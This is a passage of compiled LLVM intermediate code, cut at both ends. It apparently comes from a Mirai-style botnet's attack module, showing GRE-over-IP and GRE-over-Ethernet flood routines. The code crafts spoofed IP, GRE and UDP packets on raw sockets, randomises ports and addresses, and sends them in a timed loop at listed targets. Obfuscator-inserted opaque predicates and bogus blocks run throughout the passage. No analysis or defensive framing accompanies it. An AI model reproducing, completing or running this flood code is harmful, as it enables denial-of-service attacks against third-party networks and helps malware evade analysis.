  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i32 0, i32 7
  store i16 %579, i16* %581, align 2
  %582 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %583 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %582, i32 0, i32 7
  store i16 0, i16* %583, align 2
  %584 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %585 = bitcast %struct.iphdr* %584 to i16*
  %586 = call zeroext i16 @checksum_generic(i16* %585, i32 20)
  %587 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %588 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %587, i32 0, i32 7
  store i16 %586, i16* %588, align 2
  %589 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %590 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %589, i32 0, i32 3
  store i16 0, i16* %590, align 2
  %591 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %592 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %593 = bitcast %struct.udphdr* %592 to i8*
  %594 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %595 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %594, i32 0, i32 2
  %596 = load i16, i16* %595, align 2
  %597 = load i32, i32* %20, align 4
  %598 = sext i32 %597 to i64
  %599 = add i64 8, %598
  %600 = trunc i64 %599 to i32
  %601 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %591, i8* %593, i16 zeroext %596, i32 %600)
  %602 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %603 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %602, i32 0, i32 3
  store i16 %601, i16* %603, align 2
  %604 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %605 = load i32, i32* %11, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i64 %606
  %608 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %607, i32 0, i32 0
  %609 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %608, i32 0, i32 0
  store i16 2, i16* %609, align 4
  %610 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %611 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %610, i32 0, i32 9
  %612 = load i32, i32* %611, align 4
  %613 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %614 = load i32, i32* %11, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i64 %615
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i32 0, i32 0
  %618 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %617, i32 0, i32 2
  %619 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %618, i32 0, i32 0
  store i32 %612, i32* %619, align 4
  %620 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %621 = load i32, i32* %11, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %620, i64 %622
  %624 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %623, i32 0, i32 0
  %625 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %624, i32 0, i32 1
  store i16 0, i16* %625, align 2
  %626 = load i32, i32* %12, align 4
  %627 = load i8*, i8** %29, align 8
  %628 = load i32, i32* %20, align 4
  %629 = sext i32 %628 to i64
  %630 = add i64 52, %629
  %631 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %632 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %633 = load i32, i32* %11, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %632, i64 %634
  %636 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %635, i32 0, i32 0
  %637 = bitcast %struct.sockaddr_in* %636 to %struct.sockaddr*
  store %struct.sockaddr* %637, %struct.sockaddr** %631, align 8
  %638 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %639 = load %struct.sockaddr*, %struct.sockaddr** %638, align 8
  %640 = call i64 @sendto(i32 %626, i8* %627, i64 %630, i32 16384, %struct.sockaddr* %639, i32 16)
  %641 = load i32, i32* @x.19
  %642 = load i32, i32* @y.20
  %643 = sub i32 %641, 1
  %644 = mul i32 %641, %643
  %645 = urem i32 %644, 2
  %646 = icmp eq i32 %645, 0
  %647 = icmp slt i32 %642, 10
  %648 = or i1 %646, %647
  br i1 %648, label %originalBBpart2144, label %originalBB133alteredBB

originalBBpart2144:                               ; preds = %originalBB133
  br label %649

; <label>:649:                                    ; preds = %originalBBpart2144
  %650 = load i32, i32* %11, align 4
  %651 = add nsw i32 %650, 1
  store i32 %651, i32* %11, align 4
  br label %347

; <label>:652:                                    ; preds = %originalBBpart281
  %653 = load i32, i32* @x.19
  %654 = load i32, i32* @y.20
  %655 = sub i32 %653, 1
  %656 = mul i32 %653, %655
  %657 = urem i32 %656, 2
  %658 = icmp eq i32 %657, 0
  %659 = icmp slt i32 %654, 10
  %660 = or i1 %658, %659
  br i1 %660, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %652
  %661 = call i64 @time(i64* null) #6
  %662 = load i32, i32* %24, align 4
  %663 = sext i32 %662 to i64
  %664 = icmp sgt i64 %661, %663
  %665 = load i32, i32* @x.19
  %666 = load i32, i32* @y.20
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %664, label %673, label %674

; <label>:673:                                    ; preds = %originalBBpart2148
  br label %675

; <label>:674:                                    ; preds = %originalBBpart2148
  br label %346

; <label>:675:                                    ; preds = %673, %108, %86
  %676 = load i32, i32* @x.19
  %677 = load i32, i32* @y.20
  %678 = sub i32 %676, 1
  %679 = mul i32 %676, %678
  %680 = urem i32 %679, 2
  %681 = icmp eq i32 %680, 0
  %682 = icmp slt i32 %677, 10
  %683 = or i1 %681, %682
  br i1 %683, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %675
  %684 = load i32, i32* @x.19
  %685 = load i32, i32* @y.20
  %686 = sub i32 %684, 1
  %687 = mul i32 %684, %686
  %688 = urem i32 %687, 2
  %689 = icmp eq i32 %688, 0
  %690 = icmp slt i32 %685, 10
  %691 = or i1 %689, %690
  br i1 %691, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %87
  store i32 1, i32* %11, align 4
  %692 = load i32, i32* %12, align 4
  %693 = bitcast i32* %11 to i8*
  %694 = call i32 @setsockopt(i32 %692, i32 0, i32 3, i8* %693, i32 4) #6
  %695 = icmp eq i32 %694, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %112
  %696 = load i32, i32* %11, align 4
  %697 = load i8, i8* %7, align 1
  %698 = zext i8 %697 to i32
  %699 = icmp slt i32 %696, %698
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %183
  %700 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %701 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %702 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %701, i32 0, i32 4
  store i16 %700, i16* %702, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %203
  %703 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %704 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %703, i32 0, i32 6
  store i8 47, i8* %704, align 1
  %705 = load i32, i32* %23, align 4
  %706 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %707 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %706, i32 0, i32 8
  store i32 %705, i32* %707, align 4
  %708 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %709 = load i32, i32* %11, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %708, i64 %710
  %712 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %711, i32 0, i32 1
  %713 = load i32, i32* %712, align 4
  %714 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %715 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %714, i32 0, i32 9
  store i32 %713, i32* %715, align 4
  %716 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %717 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %718 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %717, i32 0, i32 1
  store i16 %716, i16* %718, align 2
  %719 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %720 = bitcast %struct.iphdr* %719 to i8*
  %721 = load i8, i8* %720, align 4
  %_ = sub i8 0, %721
  %gen = add i8 %_, 15
  %_11 = shl i8 %721, 15
  %_12 = sub i8 0, %721
  %gen13 = add i8 %_12, 15
  %722 = and i8 %721, 15
  %_14 = sub i8 %722, 64
  %gen15 = mul i8 %_14, 64
  %_16 = sub i8 %722, 64
  %gen17 = mul i8 %_16, 64
  %_18 = sub i8 0, %722
  %gen19 = add i8 %_18, 64
  %_20 = sub i8 0, %722
  %gen21 = add i8 %_20, 64
  %_22 = sub i8 %722, 64
  %gen23 = mul i8 %_22, 64
  %_24 = sub i8 %722, 64
  %gen25 = mul i8 %_24, 64
  %723 = or i8 %722, 64
  store i8 %723, i8* %720, align 4
  %724 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %725 = bitcast %struct.iphdr* %724 to i8*
  %726 = load i8, i8* %725, align 4
  %_26 = shl i8 %726, -16
  %_27 = shl i8 %726, -16
  %_28 = sub i8 %726, -16
  %gen29 = mul i8 %_28, -16
  %_30 = shl i8 %726, -16
  %_31 = sub i8 %726, -16
  %gen32 = mul i8 %_31, -16
  %_33 = sub i8 0, %726
  %gen34 = add i8 %_33, -16
  %_35 = sub i8 %726, -16
  %gen36 = mul i8 %_35, -16
  %727 = and i8 %726, -16
  %_37 = sub i8 0, %727
  %gen38 = add i8 %_37, 5
  %_39 = shl i8 %727, 5
  %_40 = sub i8 %727, 5
  %gen41 = mul i8 %_40, 5
  %_42 = sub i8 0, %727
  %gen43 = add i8 %_42, 5
  %728 = or i8 %727, 5
  store i8 %728, i8* %725, align 4
  %729 = load i8, i8* %14, align 1
  %730 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %731 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %730, i32 0, i32 1
  store i8 %729, i8* %731, align 1
  %732 = load i32, i32* %20, align 4
  %733 = sext i32 %732 to i64
  %_44 = sub i64 0, 28
  %gen45 = add i64 %_44, %733
  %734 = add i64 28, %733
  %735 = trunc i64 %734 to i16
  %736 = call zeroext i16 @htons(i16 zeroext %735) #7
  %737 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %738 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %737, i32 0, i32 2
  store i16 %736, i16* %738, align 2
  %739 = load i16, i16* %15, align 2
  %740 = zext i16 %739 to i32
  %_46 = shl i32 %740, -1
  %_47 = sub i32 0, %740
  %gen48 = add i32 %_47, -1
  %741 = xor i32 %740, -1
  %742 = trunc i32 %741 to i16
  %743 = call zeroext i16 @htons(i16 zeroext %742) #7
  %744 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %745 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %744, i32 0, i32 3
  store i16 %743, i16* %745, align 4
  %746 = load i8, i8* %16, align 1
  %747 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %748 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %747, i32 0, i32 5
  store i8 %746, i8* %748, align 4
  %749 = load i8, i8* %17, align 1
  %750 = icmp ne i8 %749, 0
  br label %originalBB10

originalBB52alteredBB:                            ; preds = %originalBB52, %286
  %751 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %752 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %751, i32 0, i32 8
  %753 = load i32, i32* %752, align 4
  %_53 = sub i32 %753, 1024
  %gen54 = mul i32 %_53, 1024
  %_55 = sub i32 %753, 1024
  %gen56 = mul i32 %_55, 1024
  %_57 = sub i32 %753, 1024
  %gen58 = mul i32 %_57, 1024
  %754 = sub i32 %753, 1024
  %_59 = sub i32 0, %754
  %gen60 = add i32 %_59, -1
  %_61 = sub i32 0, %754
  %gen62 = add i32 %_61, -1
  %_63 = sub i32 %754, -1
  %gen64 = mul i32 %_63, -1
  %_65 = sub i32 0, %754
  %gen66 = add i32 %_65, -1
  %_67 = shl i32 %754, -1
  %_68 = sub i32 0, %754
  %gen69 = add i32 %_68, -1
  %_70 = sub i32 0, %754
  %gen71 = add i32 %_70, -1
  %755 = xor i32 %754, -1
  %756 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %757 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %756, i32 0, i32 9
  store i32 %755, i32* %757, align 4
  br label %originalBB52

originalBB75alteredBB:                            ; preds = %originalBB75, %329
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %347
  %758 = load i32, i32* %11, align 4
  %759 = load i8, i8* %7, align 1
  %760 = zext i8 %759 to i32
  %761 = icmp slt i32 %758, %760
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %368
  %762 = load i8**, i8*** %13, align 8
  %763 = load i32, i32* %11, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds i8*, i8** %762, i64 %764
  %766 = load i8*, i8** %765, align 8
  store i8* %766, i8** %29, align 8
  %767 = load i8*, i8** %29, align 8
  %768 = bitcast i8* %767 to %struct.iphdr*
  store %struct.iphdr* %768, %struct.iphdr** %30, align 8
  %769 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %770 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %769, i64 1
  %771 = bitcast %struct.iphdr* %770 to %struct.grehdr*
  store %struct.grehdr* %771, %struct.grehdr** %31, align 8
  %772 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %773 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %772, i64 1
  %774 = bitcast %struct.grehdr* %773 to %struct.iphdr*
  store %struct.iphdr* %774, %struct.iphdr** %32, align 8
  %775 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %776 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %775, i64 1
  %777 = bitcast %struct.iphdr* %776 to %struct.udphdr*
  store %struct.udphdr* %777, %struct.udphdr** %33, align 8
  %778 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %779 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %778, i64 1
  %780 = bitcast %struct.udphdr* %779 to i8*
  store i8* %780, i8** %34, align 8
  %781 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %782 = load i32, i32* %11, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %781, i64 %783
  %785 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %784, i32 0, i32 2
  %786 = load i8, i8* %785, align 4
  %787 = zext i8 %786 to i32
  %788 = icmp slt i32 %787, 32
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %412
  %789 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %790 = load i32, i32* %11, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %789, i64 %791
  %793 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %792, i32 0, i32 1
  %794 = load i32, i32* %793, align 4
  %795 = call i32 @ntohl(i32 %794) #7
  %796 = call i32 @rand_next()
  %797 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %798 = load i32, i32* %11, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %797, i64 %799
  %801 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %800, i32 0, i32 2
  %802 = load i8, i8* %801, align 4
  %803 = zext i8 %802 to i32
  %_88 = shl i32 %796, %803
  %_89 = sub i32 %796, %803
  %gen90 = mul i32 %_89, %803
  %_91 = sub i32 %796, %803
  %gen92 = mul i32 %_91, %803
  %_93 = sub i32 %796, %803
  %gen94 = mul i32 %_93, %803
  %_95 = shl i32 %796, %803
  %804 = lshr i32 %796, %803
  %_96 = sub i32 0, %795
  %gen97 = add i32 %_96, %804
  %_98 = sub i32 %795, %804
  %gen99 = mul i32 %_98, %804
  %_100 = shl i32 %795, %804
  %_101 = sub i32 %795, %804
  %gen102 = mul i32 %_101, %804
  %_103 = sub i32 0, %795
  %gen104 = add i32 %_103, %804
  %_105 = sub i32 %795, %804
  %gen106 = mul i32 %_105, %804
  %805 = add i32 %795, %804
  %806 = call i32 @htonl(i32 %805) #7
  %807 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %808 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %807, i32 0, i32 9
  store i32 %806, i32* %808, align 4
  br label %originalBB87

originalBB110alteredBB:                           ; preds = %originalBB110, %479
  %809 = call i32 @rand_next()
  %_111 = sub i32 %809, 65535
  %gen112 = mul i32 %_111, 65535
  %_113 = sub i32 0, %809
  %gen114 = add i32 %_113, 65535
  %_115 = sub i32 0, %809
  %gen116 = add i32 %_115, 65535
  %810 = and i32 %809, 65535
  %811 = trunc i32 %810 to i16
  %812 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %813 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %812, i32 0, i32 0
  store i16 %811, i16* %813, align 2
  br label %originalBB110

originalBB120alteredBB:                           ; preds = %originalBB120, %505
  %814 = call i32 @rand_next()
  %_121 = sub i32 %814, 65535
  %gen122 = mul i32 %_121, 65535
  %_123 = shl i32 %814, 65535
  %_124 = sub i32 %814, 65535
  %gen125 = mul i32 %_124, 65535
  %815 = and i32 %814, 65535
  %816 = trunc i32 %815 to i16
  %817 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %818 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %817, i32 0, i32 1
  store i16 %816, i16* %818, align 2
  br label %originalBB120

originalBB129alteredBB:                           ; preds = %originalBB129, %527
  %819 = load i8, i8* %22, align 1
  %820 = icmp ne i8 %819, 0
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %566
  %821 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %822 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %821, i32 0, i32 7
  store i16 0, i16* %822, align 2
  %823 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %824 = bitcast %struct.iphdr* %823 to i16*
  %825 = call zeroext i16 @checksum_generic(i16* %824, i32 20)
  %826 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %827 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %826, i32 0, i32 7
  store i16 %825, i16* %827, align 2
  %828 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %829 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %828, i32 0, i32 7
  store i16 0, i16* %829, align 2
  %830 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %831 = bitcast %struct.iphdr* %830 to i16*
  %832 = call zeroext i16 @checksum_generic(i16* %831, i32 20)
  %833 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %834 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %833, i32 0, i32 7
  store i16 %832, i16* %834, align 2
  %835 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %836 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %835, i32 0, i32 3
  store i16 0, i16* %836, align 2
  %837 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %838 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %839 = bitcast %struct.udphdr* %838 to i8*
  %840 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %841 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %840, i32 0, i32 2
  %842 = load i16, i16* %841, align 2
  %843 = load i32, i32* %20, align 4
  %844 = sext i32 %843 to i64
  %_134 = shl i64 8, %844
  %_135 = sub i64 0, 8
  %gen136 = add i64 %_135, %844
  %845 = add i64 8, %844
  %846 = trunc i64 %845 to i32
  %847 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %837, i8* %839, i16 zeroext %842, i32 %846)
  %848 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %849 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %848, i32 0, i32 3
  store i16 %847, i16* %849, align 2
  %850 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %851 = load i32, i32* %11, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %850, i64 %852
  %854 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %853, i32 0, i32 0
  %855 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %854, i32 0, i32 0
  store i16 2, i16* %855, align 4
  %856 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %857 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %856, i32 0, i32 9
  %858 = load i32, i32* %857, align 4
  %859 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %860 = load i32, i32* %11, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %859, i64 %861
  %863 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %862, i32 0, i32 0
  %864 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %863, i32 0, i32 2
  %865 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %864, i32 0, i32 0
  store i32 %858, i32* %865, align 4
  %866 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %867 = load i32, i32* %11, align 4
  %868 = sext i32 %867 to i64
  %869 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %866, i64 %868
  %870 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %869, i32 0, i32 0
  %871 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %870, i32 0, i32 1
  store i16 0, i16* %871, align 2
  %872 = load i32, i32* %12, align 4
  %873 = load i8*, i8** %29, align 8
  %874 = load i32, i32* %20, align 4
  %875 = sext i32 %874 to i64
  %_137 = shl i64 52, %875
  %_138 = shl i64 52, %875
  %_139 = sub i64 52, %875
  %gen140 = mul i64 %_139, %875
  %_141 = shl i64 52, %875
  %_142 = shl i64 52, %875
  %876 = add i64 52, %875
  %877 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %878 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %879 = load i32, i32* %11, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %878, i64 %880
  %882 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %881, i32 0, i32 0
  %883 = bitcast %struct.sockaddr_in* %882 to %struct.sockaddr*
  store %struct.sockaddr* %883, %struct.sockaddr** %877, align 8
  %884 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %885 = load %struct.sockaddr*, %struct.sockaddr** %884, align 8
  %886 = call i64 @sendto(i32 %872, i8* %873, i64 %876, i32 16384, %struct.sockaddr* %885, i32 16)
  br label %originalBB133

originalBB146alteredBB:                           ; preds = %originalBB146, %652
  %887 = call i64 @time(i64* null) #6
  %888 = load i32, i32* %24, align 4
  %889 = sext i32 %888 to i64
  %890 = icmp sgt i64 %887, %889
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %675
  br label %originalBB150
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 24, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %5
  br label %698

; <label>:95:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %96 = load i32, i32* %12, align 4
  %97 = bitcast i32* %11 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %119

; <label>:100:                                    ; preds = %95
  %101 = load i32, i32* @x.21
